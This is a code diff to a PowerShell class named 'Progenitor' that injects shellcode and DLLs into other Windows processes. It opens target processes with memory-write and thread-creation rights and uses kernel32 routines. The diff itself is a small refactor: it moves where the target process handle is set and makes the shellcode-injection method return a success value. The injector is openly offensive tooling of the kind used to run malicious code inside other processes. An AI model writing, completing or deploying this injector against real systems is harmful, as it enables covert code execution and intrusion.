@@ -95,6 +95,7 @@ class Progenitor {
         [uint32]$dwAccess = $cls::VM_OP -bor $cls::VM_WRITE -bor $cls::VM_READ -bor $cls::CREATE_THREAD -bor $cls::QUERY_INFO
 
         # Open | Handle on targetted process
+        $cls::targetPID = $tPID
         $cls::targetHandle = $w32::OpenProcess($dwAccess, $false, $tPID)
     }
 
@@ -103,16 +104,14 @@ class Progenitor {
         $cls = [Progenitor]
         $conname = "InjectSHC"
 
-        $cls::TargetProcess($tPID)
-
         # Setup | Win32
         $cls::InitK32Mem()
 
         $W32 = $cls::K32Mem
 
         # Setup | Process
+        $cls::TargetProcess($tPID)
         $hProc = $cls::targetHandle
-        $tPID = $cls::targetPID
 
         # Check | Process handle
         if ($hProc -eq [IntPtr]::Zero -or $hProc -eq 0) {
@@ -139,9 +138,9 @@ class Progenitor {
         return $true
     }
 
-    static [void]InjectShc([byte[]]$shellcode) {
+    static [bool]InjectShc([byte[]]$shellcode) {
         $cls = [Progenitor]
-        $cls::InjectShc($shellcode, $cls::targetPID)
+        return ($cls::InjectShc($shellcode, $cls::targetPID))
     }
 
     static [void]InjectDLL([string]$dllPath, [uint32]$tPID) {
@@ -149,16 +148,14 @@ class Progenitor {
         $cls = [Progenitor]
         $conname = "InjectDLL"
 
-        $cls::TargetProcess($tPID)
-
         # Setup | Win32
         $cls::InitK32DLL()
 
         $W32 = $cls::K32DLL
 
         # Setup | Process
+        $cls::TargetProcess($tPID)
         $hProc = $cls::targetHandle
-        $tPID = $cls::targetPID
 
         # Map | Remote Kernel32 API
         $localBase = $W32::GetModuleHandle("kernel32.dll")
